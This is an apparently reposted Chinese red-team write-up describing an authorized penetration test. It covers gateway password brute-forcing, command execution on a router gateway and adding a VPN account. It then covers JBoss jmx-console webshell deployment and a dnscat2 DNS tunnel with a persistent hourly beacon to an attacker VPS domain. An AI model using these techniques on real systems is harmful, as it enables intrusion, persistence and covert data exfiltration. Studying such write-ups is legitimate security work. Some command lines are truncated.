从⽹关进⼊内⽹到 协
DNS
议出⽹ 安
- SecPulse.COM |
全脉搏
“ 这是 酒仙桥六号部队 的第 103 篇⽂
章。
前⾔
在⼀个⻛和⽇丽的下午，特别适合躺在草坪睡⼤觉。六点
⼗五分临近下班，突然微信响了。脑⼦⾥冒出 “嗯
哼？？？难道有⼩姐姐约我。” 打开⼀看，被 leader 拉
到⼀个群⾥，Oh My God 快下班了，⼜要吩咐⼲活的节
奏，时间紧迫，果然技术汪是不配有私⽣活的。在群⾥跟
客户以及销售对接，收集了下测试的范围、客户需求、注
意事项、以及项⽬完结的标准是什么等等。客户表示当红
队评估的标准来⼲就好，如果你能横向内⽹的话就搞叭
（此时的我仿佛在微信上看到客户露出诡异的笑容。）这
是瞧不起我？不服⽓，给授权书，整，打穿他内⽹，就完
事。
客户已经整理好⼀份列表，⾸先打开资产列表。提句题外
话 ，你知道为什么⼈类要发明⼯具吗？因为⻓期劳动中
都处于艰难的环境当中，然⽽⼯具的发明让⼈类能改善劳
动。
作为脚本⼩⼦（⼯具党），当然是直接把 URL 链接整理
⼀份，搭建好的 Xray+Awvs ⼀把梭。直接再慢慢⼀个个
从 Fofa、傻蛋、钟馗之眼等⽹络测绘引擎查询资产，使
⽤端⼝探测 nmap、和敏感⽂件、⽬录扫描⼯具，以及全
球最⼤的程序员友好交流社区 github.com、⽹盘等等进
⾏搜索和资产探测和漏洞扫描。
配置完⼯具，⼀看时间晚上七点⼗分，正好可以去楼下饭
堂明⽬张胆的薅公司⽺⽑，吃个饭，慢悠悠点根烟再回来
慢慢看。三⼗分钟过去后，回来⼀看⼯具已经跑完了，这
⼤概就是 *** 的⼒量叭。
打开漏洞扫描报告发现事情并不简单，只有⼀堆低危漏洞
跟 js 框架版本太低可能造成 xss，嗯？就这？就这？什
么？？？顿时感觉刚吃的饭不⾹了，也难怪刚才客户在群
⾥表现的很有⾃信的样⼦ 。花了三⼗分钟把漏扫报告导
出来套模版写完交差，晚上⼋点⼆⼗分，leader 看到我
的报告，表示很认可，本章节完。
其实这只是我幻想的，我骗你们的呢。leader 看完后，
表示你明天可以回村⾥种地了，不⽤过来上班。
呵，我岂是会为了这五⽃⽶弯腰？
“开个玩笑，开个玩笑，我还没开始发⼒。”
“还有五天，你再好好看看。”
正式开始
害，这⼀届安全（hun zi）真不好做，内⼼嘀咕着。捡起
饭碗，接着看信息收集的列表，打开 URL ⼀个个看，看
到⼀个特征 SiteFiles，这不就是 SiteServer 嘛。
内⼼表示暗暗有戏，这道题我会，去年才看过有⼈分析事
件有⿊产利⽤的 1day。⼩⼿⼀抖直接在 URL 后加上 /
SiteServer/
Oh…yee！？？再⼀顿⽬录扫描，好的凉了半截。
找不到后台，完全⽆望。如同编译⼯具时返回报错，告诉
你找不到对象。本想着利⽤⼀波后台远程模版下载
webshell，直捣 dmz 区⻩⻰。
只能回来再慢慢翻看看其他 web 资产，找了半天⽆果，
⼀看凌晨⼗⼆点，该洗洗睡了，熬夜 = 秃头 + 猝死，秃
头 = 找不到⼥朋友，溜了溜了。第⼆天起来再继续。
次⽇再战
多次尝试识别 cms，继续掏出我的 nday 怼了⼀通，百
思不得其 webshell，⼤概这就是彩笔（hun zi）叭，脑
海⾥响起⽼周的教导, 只有不努⼒的⿊客……。
不能就这么算，翻着翻着 nmap 端⼝扫描记录，找到⼀
个 8080 端⼝ X 捷的路由⽹关，它⻓这样：
果断上 wooyun 备份库搜索⼀波记录学习姿势。
知道默认存在三个账号 admin/master/guest。
掏出 BurpSuite 尝试爆破密码, 由于它的账号密码是在
auth 这块进⾏校验，经过了 base64 编码，并且在密码
后加个多余字符串的 7(密码等级为 7)。这⾥我们在 linux
下使⽤ awk 重新⽣成下字典。
root@x-5d67ef:~# awk '{print "guest:"$0}' x_pass.txt >
root@x-5d67ef:~# awk '{print $0"7"}' x_pass_2.txt > x_
得到字典。
接着导⼊我们的字典，我简单跑⼀下就设置了 password
top 100. 以及 base64 编码⼀下。
得到账号密码为 guest/guest，登录后针对 / LEVEL15
/ 接⼝，修改 command 参数进⾏查看配置信息 show
run.
发现管理员 admin 密码为 pwd!12345，害还是字典不够
强⼤，不过读配置能看到也⾏（也可以把 guest 提权成
admin，不过怕被发现尽量少留痕迹，能复⽤他原来的密
码尽量复⽤）。Web ⻚⾯登录管理员账号 admin 添加
SSL VPN 账号 user1/123456。
参考⽂献
《X 捷 EG 易⽹关 guest 越权, 可执⾏任意命令，通过
vpn 直接渗透内⽹》
《【RG-EG】RG-EG （⽹关模式）VPN 功能配置 SSL
VPN》
内⽹渗透
拨⼊内⽹后，通过前⾯在路由器⽹关⻚⾯⾥查看到的配置
信息。
得知内⽹ IP ⼤概有三个段，优先针对已知的信息进⾏常
⽤端⼝探测（先不考虑可能改端⼝的情况）可以节约⼤部
分时间，实在不⾏再尝试探测⼤ A／B／C 段 IP 存活，
确定存活后再决定下⼀步端⼝探测。
通过⼀顿内⽹资产探测，找到两台使⽤了 JBOSS 中间
件，确定存在对应漏洞，尝试各种 exp 直接远程命令执
⾏，反弹 nc ⽆效，感觉做了 VLAN 隔离，我们这边只
能访问业务服务器 HTTP/HTTPS 的 web 服务，⽽业务
服务器⽆法访问我们指定的端⼝跟我们进⾏通信。那远程
溢出不了，我们只能通过本地部署 war 包嵌套⼀句话⽊
⻢进去，通过 web 服务协议访问 webshell 进⾏交互。
http://10.x.x.50:8080/jmxconsole/HtmlAdaptor?action=in
e=jboss.admin:service=DeploymentFileRepository,定位到st
尝试直接上传 test.war 部署⼀句话到⽹站根⽬录，尝试
访问下失败。
⾃⼰本地搭建了⼀下 vulhub，发现复现正常，没啥特殊
情况。。
这边估计有做过什么限制， 想了想。
应该可以把 war 包部署到已知的⽬录下，⽐如 Jmx-
console.war。说⼲就⼲，本地复现成功。转到当前环境
下进⾏实现。
先修改 BaseDir 到./deploy/：
接着修改 P1 修改 为 jmx-console.war p2 ⽂件名 p3 ⽂
件后缀名 p4 ⼀句话⽊⻢。
传⼊相应的值，即可 getshell。
嘿嘿成功拿到两台 root，但发现果然跟猜想的⼀样，服
务器⽆法正常访问外⽹，做了限制。
跟客户沟通了下，客户说可以继续，让我们看看能不能把
内⽹的机器跟外⽹的机器进⾏通信。既然得到准许了，那
接下来就可以继续发挥发挥。
尝试使⽤ ping www.qq.com 发现⽆法 ping 通，说明
ICMP 协议不⾏，直接冰蝎尝试 socks5 也不⽀持。使⽤
curl 访问外⽹也不⾏，说明 http/https 也不出⽹。直接
⽤ msf 反弹 tcp 也不⽀持。
Xd 们把害怕打在公屏上。
接着想起多年溯源反制中，挖矿经常使⽤的 DNS 协议进
⾏对外通信。查了下资料发现 dnscat2 可以⽀持，开源
万岁，现学现卖。
先配置域名的 dns。
A 记录配置⼀个指向攻击者 VPS 的 IP。
例如 A 记录 0，对应 IP108.x.x.216。
NS 记录配置你前⾯设置的 A 记录。
006.xxx.bio 对应 0.xxx.bio.
本地下载 dnscat2，安装这⾥跳过，⾃⼰去看 github 上
的⽂档叭。
本地执⾏监听：
./dnscat –dns domain=006.xxx.bio
接着上传 client 对应的代码到 / tmp 下。进⾏ make 编
译。
编译完成后，执⾏命令。
nohup /bin/bash –c “white true; do /tmp/dnscat –dns do
每隔⼀个⼩时进⾏反弹。
记住这⾥ --dns domain ⼀定要填域名，我前⾯测试尝
试直接填 IP 进⾏ dns 53 端⼝通信发现不⾏（以及这个
⼯具⽀持加密传输，如果怕被流量探测发现可以考虑把流
量加密 参数 --secret）。
成功反弹回来本地。
然后？
然后跟甲⽅爸爸汇报，甲⽅爸爸表示对咱们技术很认可，
没必要再继续了。
总结回顾
1. 对外⽹⼤量资产常规 cms 进⾏漏洞探测⽆果。
2. 转战发现 EG 易⽹关。
3. 通过 EG 易⽹关找到未授权命令执⾏，添加 vpn
进⼊内⽹。
4. 对内⽹资产进⾏探测发现使⽤ jboss 中间件的服
务器, 发现 java 反序列化⽆法直接利⽤。
5. 本地搭建环境进⾏漏洞复现，通过本地部署
webshell 到其他⽬录下绕过限制。
6. 发现各种协议⽆效，通过 dns 协议成功出⽹，结
束本次项⽬。
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明